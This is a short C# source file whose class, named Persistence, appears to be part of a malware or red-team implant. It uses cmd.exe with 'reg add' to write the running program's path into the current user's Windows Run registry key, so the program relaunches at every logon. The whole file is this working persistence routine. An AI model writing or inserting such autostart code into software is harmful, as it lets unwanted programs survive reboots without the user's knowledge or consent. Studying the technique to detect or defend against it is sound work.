using System;
using System.IO;
using System.Reflection;
using System.Diagnostics;

public class Persistence
{
    public void persistence()
    {
        string execPath = Assembly.GetEntryAssembly().Location;
        Console.WriteLine(execPath);
        string command = "/C reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v persistence /t REG_SZ /d " + execPath;
        Process.Start("cmd.exe", command);
    }

}